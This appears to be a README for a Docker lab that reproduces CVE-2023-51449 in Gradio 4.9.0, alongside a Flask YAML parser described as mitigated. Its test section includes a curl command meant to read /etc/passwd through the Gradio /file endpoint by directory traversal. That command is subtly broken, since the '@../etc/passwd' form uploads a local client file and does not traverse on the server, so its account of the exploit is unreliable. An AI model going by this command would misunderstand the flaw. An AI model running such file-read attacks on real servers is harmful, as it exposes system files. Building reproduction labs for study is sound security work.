# Vulnerable Application for CVE-2023-51449

This Docker‑Compose setup deploys a minimal Flask application that deliberately uses the safe `yaml.safe_load` function (the RCE path has been mitigated). It also runs a Gradio demo (version 4.9.0) which provides the vulnerable `/file` endpoint described in CVE‑2023‑51449.

## How to test the vulnerabilities

```bash
# Start the environment
docker compose up -d

# Flask YAML parser (no RCE, but still parses YAML safely)
curl -X POST -d "key: value" http://localhost:5000/parse

# Gradio file endpoint (unauthenticated local file inclusion)
# The Gradio UI is available at http://localhost:7860
# Use the file upload component to request a file such as /etc/passwd via directory traversal:
# Example using curl (requires proper multipart form, shown for illustration):
curl -X POST -F "data=@../etc/passwd" http://localhost:7860/file
```

The second request demonstrates the Gradio `/file` endpoint that, when paired with the vulnerable Gradio version, can be abused for arbitrary file reads.

## Cleanup

```bash
docker compose down -v
```
